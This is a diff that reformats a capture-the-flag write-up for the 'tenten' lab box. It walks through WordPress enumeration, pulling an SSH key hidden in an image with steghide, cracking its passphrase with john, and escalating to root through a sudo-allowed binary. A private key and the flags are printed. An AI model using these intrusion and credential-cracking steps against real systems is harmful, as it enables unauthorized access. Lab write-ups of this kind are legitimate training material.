@@ -1,18 +1,21 @@
 # tenten
 
+## tenten
+
 tenten was a relatively easy medium linux box that involved recon of the wordpress site to find a jpg file. We then run steghide on the file to get an rsa key which we extract the password from using ssh2john. We then ssh into the box as user, for root we find an intersesting file called `fuckin` which we can abuse to get comand execution and read the root flag.
 
 > Skills involved in this box:
-- enumeration
-- privelage escalation
-- hash cracking
-- steghide
+>
+> * enumeration
+> * privelage escalation
+> * hash cracking
+> * steghide
 
-# USER
+## USER
 
 > Nmap
 
-```shell
+```text
 nmap -sC -sV -o nmap 10.10.10.10
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 09:24 EDT                                                    
@@ -36,7 +39,7 @@ Our nmap scan reveals just 2 ports open, 22 on ssh and port 80 on http.
 
 We head over to the website and se imeediately that it is wordpress, instead of using dirbuster or any oter reconnaisance tools we use wpscan which is made specifically for wordpress.
 
-```shell
+```text
 $ sudo wpscan -u http://10.10.10.10 
 [+] We found 1 plugins:
 
@@ -61,24 +64,25 @@ Afer navigating to the http page and enumerating the website we come accross the
 
 `http://10.10.10.10/index.php/jobs/apply/8/`
 
+We can see that there is the number `8` which we assume is the id of the person logged on, we test a few more numbers and we get a unique user called `HackerAccessGranted` we assume that this has to be the right thing.
 
- We can see that there is the number `8` which we assume is the id of the person logged on, we test a few more numbers and we get a unique user called `HackerAccessGranted` we assume that this has to be the right thing.
+We could also get this by intercepting the request with burpsuite and sending it to intruder, we then generate a custom payload with numbers\(e.g like 1-20\), then take a look at the output and get the same response for number 13.
 
- We could also get this by intercepting the request with burpsuite and sending it to intruder, we then generate a custom payload with numbers(e.g like 1-20), then take a look at the output and get the same response for number 13.
+> Exploit
 
- >Exploit
+he wordpress directory structure for the uploaded files is known as /wp-content/uploads/%year%/%month%/%filename% - file structure for wordpress
 
- he wordpress directory structure for the uploaded files is known as /wp-content/uploads/%year%/%month%/%filename% - file structure for wordpress
+We test file extensions for our wanted file and it finally works with a `jpg` file.
 
-We test file extensions for our wanted file and it finally  works with a `jpg` file.
-```shell
+```text
 wget http://10.10.10.10/wp-content/uploads/2017/04/HackerAccessGranted.jpg
 ```
+
 This can also be find by fuzzing further for files or by using an exploit `CVE-2015-6668` which is a python script that bruteforces files and shows us the image file.
 
 We then run steghide on this image to see if we can exfiltrate any hidden data inside it.
 
-```shell
+```text
 kali@kali:~/boxes/tenten$ steghide extract -sf HackerAccessGranted.jpg
 Enter passphrase: 
 wrote extracted data to "id_rsa".
@@ -115,20 +119,22 @@ vIUE1/YssXMO7TK6iBIXCuuOUtOpGiLxNVRIaJvbGmazLWCSyptk5fJhPLkhuK+J
 YoZn9FNAuRiYFL3rw+6qol+KoqzoPJJek6WHRy8OSE+8Dz1ysTLIPB6tGKn7EWnP
 -----END RSA PRIVATE KEY-----
 ```
-It works and it outputs to a file called id_rsa which is the ssh key for the user takis.
+
+It works and it outputs to a file called id\_rsa which is the ssh key for the user takis.
 
 We try ssh into the box but the key is password protected.
 
-```shell
+```text
 kali@kali:~/boxes/tenten$ chmod 600 id_rsa
 kali@kali:~/boxes/tenten$ ssh -i id_rsa takis@10.10.10.10
 load pubkey "id_rsa": invalid format
 Enter passphrase for key 'id_rsa': 
 takis@10.10.10.10's password:
 ```
+
 From here we tried `ssh2john.py` with `john` which worked great!
 
-```shell
+```text
 sudo /usr/share/john/ssh2john.py  id_rsa > hash
 
 kali@kali:~/boxes/tenten$ sudo john -w=/home/kali/rockyou.txt hash
@@ -144,12 +150,12 @@ superpassword    (id_rsa)
 1g 0:00:00:07 DONE (2020-06-22 09:41) 0.1416g/s 2031Kp/s 2031Kc/s 2031KC/sa6_123..*7¡Vamos!
 Session completed
 ```
+
 So now we got our password `superpassword`.
 
 We ssh into the box and read our user flag.
 
-```shell
-
+```text
 kali@kali:~/boxes/tenten$ ssh -i id_rsa takis@10.10.10.10
 load pubkey "id_rsa": invalid format
 Enter passphrase for key 'id_rsa': 
@@ -169,10 +175,12 @@ user.txt
 takis@tenten:~$ cat user.txt
 e5c7ed3b89e73049c04c432fc8686f31
 ```
-# ROOT
+
+## ROOT
 
 We run `sudo -l` to check if we have any privs for running things as sudo and it turns out that we do.
-```shell
+
+```text
 takis@tenten:~$ sudo -l
 Matching Defaults entries for takis on tenten:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
@@ -181,10 +189,12 @@ User takis may run the following commands on tenten:
     (ALL : ALL) ALL
     (ALL) NOPASSWD: /bin/fuckin
 ```
+
 we can see here that the user can run the file `fuckin` as root.
 
 We experiment with what the file can do and we realise that we can simply specify the command after the file, we willl use this to read the root flag.
-```shell
+
+```text
 takis@tenten:~$ fuckin cat /root/root.txt
 cat: /root/root.txt: Permission denied
 takis@tenten:~$ fuckin id
@@ -193,6 +203,8 @@ takis@tenten:~$ sudo fuckin id
 uid=0(root) gid=0(root) groups=0(root)
 takis@tenten:~$ sudo fuckin cat /root/root.txt
 f9f7291e39a9a2a011b1425c3e08f603
-takis@tenten:~$ 
+takis@tenten:~$
 ```
+
 Thanks for reading hope you enjoyed!
+
